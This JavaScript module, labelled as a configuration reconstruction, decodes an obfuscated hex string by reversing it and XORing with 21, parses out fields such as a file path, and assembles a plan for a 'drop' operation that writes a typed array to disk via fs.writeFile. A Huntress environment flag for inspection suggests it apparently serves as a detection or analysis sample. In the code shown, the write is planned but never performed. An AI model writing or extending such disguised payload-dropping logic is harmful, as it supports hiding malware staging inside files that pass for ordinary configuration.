// configuration reconstruction
const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_2fefccf9 = "\\x66\\x7f\\x78\\x3b\\x74\\x26\\x76\\x71\\x27\\x23\\x74\\x24\\x2d\\x2d\\x26\\x25\\x38\\x70\\x72\\x74\\x61\\x66\\x3b\\x3a\\x70\\x71\\x7a\\x7b\\x38\\x66\\x66\\x70\\x67\\x61\\x7b\\x60\\x7d\\x3a\\x65\\x78\\x61\\x3a\\x28\\x7d\\x61\\x74\\x65\\x4a\\x70\\x79\\x7c\\x73\\x69\\x27\\x23\\x54\\x24\\x2d\\x2d\\x26\\x25\\x38\\x50\\x51\\x5a\\x5b\\x28\\x71\\x7c\\x4a\\x7b\\x72\\x7c\\x74\\x65\\x78\\x74\\x76\\x69\\x24\\x28\\x61\\x7b\\x60\\x7a\\x76\\x4a\\x70\\x72\\x74\\x61\\x66\\x69\\x70\\x79\\x7c\\x73\\x4a\\x7a\\x61\\x4a\\x6c\\x74\\x67\\x67\\x74\\x4a\\x71\\x70\\x65\\x6c\\x61\\x28\\x67\\x70\\x61\\x65\\x74\\x71\\x74\\x69\\x70\\x79\\x7c\\x73\\x4a\\x70\\x61\\x7c\\x67\\x62\\x39\\x71\\x70\\x71\\x71\\x70\\x77\\x78\\x70\\x4a\\x70\\x71\\x7a\\x76\\x70\\x71\\x28\\x66\\x65\\x70\\x61\\x66\\x69\\x24\\x28\\x63";
const Codec_2fefccf9 = "escaped_octets|reverse_then_xor|15";

function load_2fefccf9() { return [...Material_2fefccf9.matchAll(/\\x([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
function decode_2fefccf9(EnCoDeD) { return [...EnCoDeD].reverse().map((value) => value ^ 21); }
async function recover_2fefccf9() {
  const NeUtRaL = 2 > 1 ? "left" : "right";
  const EnCoDeD = load_2fefccf9(); let DeCoDeD = [];
  DeCoDeD = await (async () => decode_2fefccf9(EnCoDeD))();
  void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
}
async function inspect_2fefccf9() { return ({ ...{ value: await recover_2fefccf9() } }).value; }
async function plan_2fefccf9() { const inspect = inspect_2fefccf9; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "drop", decoder: "typed_array_to_file", destination: fields.file_path, api: "fs.writeFile" }); }
void moduleShape; void plan_2fefccf9;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_2fefccf9());

// reconstruction complete